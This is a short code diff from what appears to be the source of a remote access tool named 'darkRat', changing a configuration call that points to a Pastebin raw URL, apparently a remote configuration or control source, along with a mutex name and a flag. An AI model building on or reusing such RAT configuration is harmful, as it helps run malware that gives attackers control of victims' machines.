@@ -77,7 +77,7 @@ namespace darkRat
 			}
 			
 		//	return config("KQC", "http://pastebin.com/raw/mTLXBksj", "mutex", "false", 5, {});
-			return config("KQC", "http://pastebin.com/raw/mTLXBksj", "mutex", "true", 5, {});
+			return config("KQC", "http://pastebin.com/raw/mTLXBksj", "mutextest", "false", 5, {});
 		}
 	}
 }
